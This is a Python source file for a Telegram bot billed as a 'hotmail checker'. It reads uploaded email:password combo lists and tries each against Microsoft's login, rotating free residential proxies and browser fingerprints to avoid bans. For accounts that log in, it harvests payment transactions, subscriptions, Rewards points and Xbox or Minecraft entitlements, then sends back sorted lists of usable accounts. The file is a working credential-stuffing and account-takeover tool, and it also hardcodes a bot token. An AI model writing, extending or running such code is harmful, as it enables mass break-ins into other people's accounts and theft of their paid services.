import asyncio
import aiohttp
import json
import logging
import os
import re
import time
import zipfile
import shutil
import uuid
import datetime
import random
from urllib.parse import urlparse, parse_qs, quote
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHiFpZ3K18tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]

MAX_CONCURRENT = 5          # balance: fast enough, slow enough to not get insta-banned
TIMEOUT = 20
TEMP_DIR = "./temp"

# SFTAG web login (Wurst7-proven endpoint)
SFTAG_CLIENT_ID = "00000000402B5328"
SFTAG_URL = (
    f"https://login.live.com/oauth20_authorize.srf?client_id={SFTAG_CLIENT_ID}"
    "&response_type=code"
    "&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL"
    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
)
ATK_CLIENT_ID = "000000000004773A"   # PIFD silent delegate

# Xbox / Minecraft chain
XBL_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
MC_LOGIN_URL = "https://api.minecraftservices.com/authentication/login_with_xbox"
MC_ENTITLEMENTS_URL = "https://api.minecraftservices.com/entitlements/mcstore"
PROFILE_URL = "https://profile.xboxlive.com/users/xuid({xuid})/profile/settings"

# Payment APIs
PAYMENT_INSTRUMENTS_URL = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
PAYMENT_TRANSACTIONS_URL = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
REWARDS_URL = "https://rewards.bing.com/"

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

# ============================================================
# HELPERS
# ============================================================
def parse_lr(text, left, right):
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except ValueError:
        return ""

def full_headers():
    return {
        "User-Agent": random.choice(UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Sec-CH-UA": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
    }

# ============================================================
# PROXY POOL — auto-fetch + validate against login.live.com
# ============================================================
PROXIES = []
PROXY_FAILURES = {}
PROXY_MAX_FAILURES = 3

def pick_proxy():
    healthy = [p for p in PROXIES if PROXY_FAILURES.get(p, 0) < PROXY_MAX_FAILURES]
    if not healthy:
        PROXY_FAILURES.clear()
        healthy = PROXIES
    return random.choice(healthy) if healthy else None

def mark_proxy_failed(p):
    if p:
        PROXY_FAILURES[p] = PROXY_FAILURES.get(p, 0) + 1

async def validate_proxy(session, proxy):
    """Only proxies that can actually reach Microsoft's login page make the pool."""
    try:
        async with session.get(
            SFTAG_URL,
            headers={"User-Agent": random.choice(UAS), "Accept": "text/html,*/*;q=0.8"},
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=12),
            allow_redirects=True,
        ) as r:
            if r.status != 200:
                return False
            body = await r.text()
            return ("sFTTag" in body or "PPFT" in body or "urlPost" in body)
    except Exception:
        return False

async def fetch_proxies():
    global PROXIES
    candidates = []

    # 1) proxmint — re-validated every 30 min, raw GitHub, no key
    for url in [
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/all.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks5.txt",
    ]:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                    if r.status == 200:
                        for line in (await r.text()).splitlines():
                            line = line.strip()
                            if line and "://" in line:
                                candidates.append(line)
                            elif line and ":" in line:
                                candidates.append("http://" + line)
        except Exception:
            pass

    # 2) ProxyScrape v4 — filter hosting:false (residential)
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocol&format=json",
                timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    items = data if isinstance(data, list) else data.get("proxies", [])
                    for it in items:
                        if not isinstance(it, dict):
                            continue
                        if not it.get("alive", True):
                            continue
                        if it.get("ip_data", {}).get("hosting", True):
                            continue  # skip datacenter
                        if it.get("uptime", 0) < 20:
                            continue
                        ip, port = it.get("ip", ""), it.get("port", "")
                        proto = it.get("protocol", "http")
                        if ip and port:
                            scheme = "socks5" if proto == "socks5" else "http"
                            candidates.append(f"{scheme}://{ip}:{port}")
    except Exception:
        pass

    # dedupe
    seen, unique = set(), []
    for p in candidates:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    random.shuffle(unique)

    # cap validation to keep startup fast
    unique = unique[:120]
    log.info(f"validating {len(unique)} candidate proxies against login.live.com...")

    validated = []
    sem = asyncio.Semaphore(40)
    connector = aiohttp.TCPConnector(limit=100, ssl=False)

    async def check_one(p):
        async with sem:
            ok = await validate_proxy(session, p)
            if ok:
                validated.append(p)

    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*(check_one(p) for p in unique))

    PROXIES = validated
    log.info(f"proxy pool ready: {len(PROXIES)} working")

    if not PROXIES:
        log.warning("no validated proxies — running direct (Render IP will be rate-limited)")

# ============================================================
# SFTAG LOGIN
# ============================================================
async def sftag_login(session, email, password):
    for attempt in range(3):
        proxy = pick_proxy()
        try:
            async with session.get(
                SFTAG_URL, headers=full_headers(), proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT), allow_redirects=True,
            ) as r:
                if r.status == 429:
                    await asyncio.sleep(3)
                    continue
                body = await r.text()

            # Wurst7-style extraction: sFTTag regex + urlPost regex
            post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, "urlPost:'", "'") or parse_lr(body, 'urlPost: "', '"')
            ppft = parse_lr(body, 'sFTTag:', '') and parse_lr(body, 'value="', '"/>')
            if not ppft:
                ppft = parse_lr(body, 'name="PPFT"', 'value="')
                if ppft:
                    ppft = ppft.split('value="')[-1].split('"')[0]
            if not ppft:
                m = re.search(r'sFTTag:\s*[\'"].*?value="([^"]+)"', body, re.S)
                if m:
                    ppft = m.group(1)
            if not post_url or not ppft:
                await asyncio.sleep(2)
                continue

            payload = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "ps": "2",
                "PPFT": ppft, "PPSX": "PassportR", "NewUser": "1",
                "FoundMSAs": "", "fspost": "0", "i21": "0",
                "CookieDisclosure": "0", "IsFidoSupported": "0", "i19": "9960",
            }
            async with session.post(
                post_url, data=payload,
                headers={**full_headers(), "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://login.live.com"},
                proxy=proxy, allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            ) as r2:
                loc = r2.headers.get("Location", "")
                if "access_token=" not in loc:
                    text = await r2.text()
                    low = text.lower()
                    if "account or password is incorrect" in low or r2.status == 401:
                        return "bad"
                    if "identity/confirm" in loc or "recover" in loc:
                        return "2fa"
                    if "too many times" in low or r2.status == 429:
                        mark_proxy_failed(proxy)
                        await asyncio.sleep(3)
                        continue
                    continue

                ms_token = parse_lr(loc, "access_token=", "&")
                cid = ""
                for c in session.cookie_jar:
                    if c.key == "MSPCID":
                        cid = c.value.upper()
                        break
                return {"ms_token": ms_token, "cid": cid}
        except Exception:
            mark_proxy_failed(proxy)
            await asyncio.sleep(2)
    return "error"

# ============================================================
# PIFD ATK + PAYMENT DATA
# ============================================================
async def get_pifd_atk(session):
    url = (
        f"https://login.live.com/oauth20_authorize.srf?client_id={ATK_CLIENT_ID}"
        "&response_type=token"
        "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
        "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
        "&prompt=none"
    )
    try:
        async with session.get(
            url, headers=full_headers(), proxy=pick_proxy(),
            allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            loc = r.headers.get("Location", "")
            return parse_lr(loc, "access_token=", "&token_type")
    except Exception:
        return ""

async def get_payment_data(session, atk):
    headers = {
        "User-Agent": random.choice(UAS),
        "Authorization": f'MSADELEGATE1.0="{atk}"',
        "Accept": "application/json",
        "Origin": "https://account.microsoft.com",
        "Referer": "https://account.microsoft.com/",
    }
    result = {"subs": [], "points": "0"}

    # --- transactions: JSON first, regex fallback ---
    try:
        async with session.get(
            PAYMENT_TRANSACTIONS_URL, headers=headers, proxy=pick_proxy(),
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            if r.status == 200:
                body = await r.text()
                parsed = None
                try:
                    parsed = json.loads(body)
                except Exception:
                    pass

                subs_raw, orders_raw = [], []
                if isinstance(parsed, dict):
                    subs_raw = parsed.get("subscriptions", []) or []
                    orders_raw = parsed.get("orders", []) or []
                elif isinstance(parsed, list):
                    for item in parsed:
                        if isinstance(item, dict):
                            if "subscriptionId" in item:
                                subs_raw.append(item)
                            elif "orderId" in item:
                                orders_raw.append(item)

                now = datetime.datetime.utcnow()
                seen_titles = set()

                for sub in subs_raw:
                    if not isinstance(sub, dict):
                        continue
                    title = sub.get("title", "Unknown")
                    nd = sub.get("nextRenewalDate", "")
                    active = True
                    next_date = "N/A"
                    if nd:
                        next_date = nd.split("T")[0]
                        try:
                            if datetime.datetime.strptime(next_date, "%Y-%m-%d") < now:
                                active = False
                        except Exception:
                            pass
                    if not active:
                        continue
                    line = f"{title}"
                    if next_date != "N/A":
                        line += f" | Next Billing: {next_date}"
                    if title not in seen_titles:
                        result["subs"].append(line)
                        seen_titles.add(title)

                for order in orders_raw:
                    if not isinstance(order, dict):
                        continue
                    title = order.get("title", "Unknown")
                    if title and title not in seen_titles:
                        result["subs"].append(f"{title} (Game)")
                        seen_titles.add(title)

                # regex fallback if JSON yielded nothing
                if not result["subs"]:
                    for m in re.finditer(r'"title":"([^"]+)".*?"nextRenewalDate":"([^"]+)"', body, re.DOTALL):
                        title, nd = m.group(1), m.group(2).split("T")[0]
                        try:
                            if datetime.datetime.strptime(nd, "%Y-%m-%d") >= now:
                                result["subs"].append(f"{title} | Next Billing: {nd}")
                        except Exception:
                            result["subs"].append(f"{title} | Next Billing: {nd}")
                    for m in re.finditer(r'"title":"([^"]+)".*?"orderId"', body, re.DOTALL):
                        t = m.group(1)
                        if not any(t in s for s in result["subs"]):
                            result["subs"].append(f"{t} (Game)")
    except Exception:
        pass

    # --- rewards points ---
    try:
        async with session.get(
            REWARDS_URL, headers={"User-Agent": random.choice(UAS)},
            proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            if r.status == 200:
                txt = await r.text()
                m = re.search(r'"availablePoints":(\d+)', txt)
                if m:
                    result["points"] = m.group(1)
    except Exception:
        pass

    return result

# ============================================================
# XBOX / MINECRAFT ENTITLEMENTS
# ============================================================
async def get_xbox_token(session, ms_token):
    try:
        async with session.post(
            XBL_AUTH_URL,
            json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                  "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            if r.status == 200:
                d = await r.json()
                return d.get("Token"), d["DisplayClaims"]["xui"][0]["uhs"]
    except Exception:
        pass
    return None, None

async def get_xsts(session, xbl_token, relying_party):
    try:
        async with session.post(
            XSTS_URL,
            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                  "RelyingParty": relying_party, "TokenType": "JWT"},
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            if r.status == 200:
                d = await r.json()
                xui = d.get("DisplayClaims", {}).get("xui", [])
                if xui:
                    return d.get("Token"), xui[0].get("uhs", ""), xui[0].get("xid", "")
    except Exception:
        pass
    return None, None, None

async def check_minecraft(session, xbl_token):
    xsts_token, uhs, xuid = await get_xsts(session, xbl_token, "rp://api.minecraftservices.com/")
    if not xsts_token:
        return None
    try:
        async with session.post(
            MC_LOGIN_URL,
            json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
            headers={"Content-Type": "application/json"},
            proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            if r.status != 200:
                return None
            mc_token = (await r.json()).get("access_token")
            if not mc_token:
                return None
        async with session.get(
            MC_ENTITLEMENTS_URL,
            headers={"Authorization": f"Bearer {mc_token}"},
            proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT),
        ) as r:
            if r.status != 200:
                return None
            text = await r.text()
            if "product_game_pass_ultimate" in text:
                return "Xbox Game Pass Ultimate"
            if "product_game_pass_pc" in text:
                return "Xbox Game Pass (PC)"
            if "product_minecraft" in text:
                return "Minecraft"
    except Exception:
        pass
    return None

# ============================================================
# MASTER CHECK
# ============================================================
async def check_account(session, email, password):
    res = {"email": email, "pw": password, "status": "bad", "data": None, "minecraft": None, "reason": ""}

    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as local:
        login = await sftag_login(local, email, password)
        if login == "bad":
            return res
        if login == "2fa":
            res["status"] = "2fa"
            return res
        if login == "error":
            res["status"] = "error"
            res["reason"] = "ip_block_or_ppft_fail"
            return res
        if not isinstance(login, dict):
            res["status"] = "error"
            res["reason"] = "unknown_login_fail"
            return res

        res["status"] = "valid"

        # payment data (subs + points)
        atk = await get_pifd_atk(local)
        if atk:
            res["data"] = await get_payment_data(local, atk)
        else:
            res["data"] = {"subs": [], "points": "0"}

        # xbox / minecraft entitlements
        xbl, _ = await get_xbox_token(local, login["ms_token"])
        if xbl:
            res["minecraft"] = await check_minecraft(local, xbl)

    return res

# ============================================================
# PROCESSING
# ============================================================
async def process_combos(combos, chat_id, status_msg, bot):
    results = []
    done, total, t_start, last_edit = 0, len(combos), time.time(), 0.0
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(email, password):
            nonlocal done, last_edit
            try:
                async with sem:
                    r = await asyncio.wait_for(check_account(session, email, password), timeout=60)
            except asyncio.TimeoutError:
                r = {"email": email, "pw": password, "status": "error", "data": None, "minecraft": None, "reason": "timeout"}
            except Exception as e:
                r = {"email": email, "pw": password, "status": "error", "data": None, "minecraft": None, "reason": str(e)[:40]}
            results.append(r)
            done += 1

            now = time.time()
            if now - last_edit >= 4.0 or done == total:
                last_edit = now
                hits = sum(1 for x in results if x["status"] == "valid")
                bad = sum(1 for x in results if x["status"] == "bad")
                tfa = sum(1 for x in results if x["status"] == "2fa")
                err = sum(1 for x in results if x["status"] == "error")
                elapsed = now - t_start
                try:
                    await status_msg.edit_text(
                        f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\n"
                        f"valid: <b>{hits}</b> | 2fa: <b>{tfa}</b> | err: <b>{err}</b>\n"
                        f"bad: <b>{bad}</b>\nspeed: <code>{int((done/max(elapsed,1))*60)} cpm</code>",
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass

        await asyncio.gather(*(worker(e, p) for e, p in combos))

    elapsed = time.time() - t_start
    valid = [r for r in results if r["status"] == "valid"]
    bad = [r for r in results if r["status"] == "bad"]
    tfa = [r for r in results if r["status"] == "2fa"]
    errors = [r for r in results if r["status"] == "error"]

    ts = int(time.time())
    workdir = os.path.join(TEMP_DIR, f"run_{ts}")
    os.makedirs(workdir, exist_ok=True)

    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

    valid_all, valid_subs, valid_nosub, gamepass_lines = [], [], [], []

    for r in valid:
        line = f"{r['email']}:{r['pw']}"
        valid_all.append(line)

        d = r["data"] or {"subs": [], "points": "0"}
        subs = d.get("subs", [])
        pts = d.get("points", "0")

        if subs or pts != "0":
            sub_str = ", ".join(subs) if subs else "None"
            valid_subs.append(f"{line} | Points: {pts} | Subs: [{sub_str}]")
        else:
            valid_nosub.append(line)

        if any("pass" in s.lower() for s in subs):
            gamepass_lines.append(f"{line} | {', '.join(subs)}")

    write_file("Valid_All.txt", valid_all)
    write_file("Valid_Subscriptions.txt", valid_subs)
    write_file("Valid_No_Subscription.txt", valid_nosub)
    write_file("Invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
    write_file("2FA.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
    write_file("Errors.txt", [f"{r['email']}:{r['pw']} | {r['reason']}" for r in errors])
    if gamepass_lines:
        write_file("GamePass.txt", gamepass_lines)
    write_file("summary.txt", [
        f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}",
        f"Checked: {total}",
        f"Valid: {len(valid)}",
        f"Invalid: {len(bad)}",
        f"2FA: {len(tfa)}",
        f"Errors: {len(errors)}",
        f"Proxies: {len(PROXIES)}",
    ])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fn in os.listdir(workdir):
            zf.write(os.path.join(workdir, fn), arcname=fn)

    await status_msg.edit_text(
        f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\n"
        f"valid: <b>{len(valid)}</b>\nerrors: <b>{len(errors)}</b>\n"
        f"time: <code>{elapsed:.1f}s</code>",
        parse_mode=ParseMode.HTML,
    )
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(valid)}_valid.zip"))

    shutil.rmtree(workdir, ignore_errors=True)
    try:
        os.remove(zip_path)
    except Exception:
        pass

# ============================================================
# TELEGRAM
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS:
        return await msg.answer("not authorized.")
    await msg.answer(
        "<b>hotmail checker</b>\n\n"
        "send a .txt file with <code>email:password</code> combos\n"
        f"proxies loaded: <code>{len(PROXIES)}</code>"
    )

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS:
        return
    if not msg.document.file_name.lower().endswith(".txt"):
        return await msg.answer("send a .txt file.")

    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e:
        return await status.edit_text(f"download failed: {e}")

    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p:
                    combos.append((e.strip(), p.strip()))
    os.remove(local)

    if not combos:
        return await status.edit_text("no valid combos found.")

    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
    await process_combos(combos, msg.chat.id, status, bot)

# ============================================================
# WEB SERVER — Render free tier needs this
# ============================================================
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"web server on port {port}")

async def main():
    # open port FIRST so Render doesn't time out
    asyncio.create_task(web_server())
    await fetch_proxies()
    log.info(f"starting | proxies={len(PROXIES)} | threads={MAX_CONCURRENT}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
